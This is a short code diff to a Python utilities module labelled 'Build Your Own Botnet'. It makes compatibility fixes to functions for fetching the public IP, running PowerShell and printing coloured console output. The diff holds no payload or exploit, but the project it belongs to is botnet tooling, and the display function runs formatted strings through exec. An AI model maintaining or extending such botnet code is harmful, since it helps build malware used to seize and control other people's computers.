@@ -1,7 +1,7 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 'Utilities (Build Your Own Botnet)'
-
+from __future__ import print_function
 _debug = False
 
 # main
@@ -72,7 +72,7 @@ def public_ip():
     if sys.version_info[0] > 2:
         from urllib.request import urlopen
     else:
-        from urllib import urlopen
+        from urllib2 import urlopen
     return urlopen('http://api.ipify.org').read()
 
 def local_ip():
@@ -376,7 +376,7 @@ def powershell(code):
     except Exception as e:
         log("{} error: {}".format(powershell.__name__, str(e)))
 
-def display(output, color=None, style=None, end='\n', event=None, lock=None):
+def display(output, color=None, style=None, end='\\n', event=None, lock=None):
     """
     Display output in the console
 
@@ -393,14 +393,17 @@ def display(output, color=None, style=None, end='\n', event=None, lock=None):
     """
     import colorama
     colorama.init()
-    output = str(output)
+    if isinstance(output, bytes):
+        output = output.decode('utf-8')
+    else:
+        output = str(output)
     _color = ''
     if color:
         _color = getattr(colorama.Fore, color.upper())
     _style = ''
     if style:
         _style = getattr(colorama.Style, style.upper())
-    exec("print(_color + _style + output){}".format(end))
+    exec("""print(_color + _style + output + colorama.Style.RESET_ALL, end="{}")""".format(end))
 
 def color():
     """
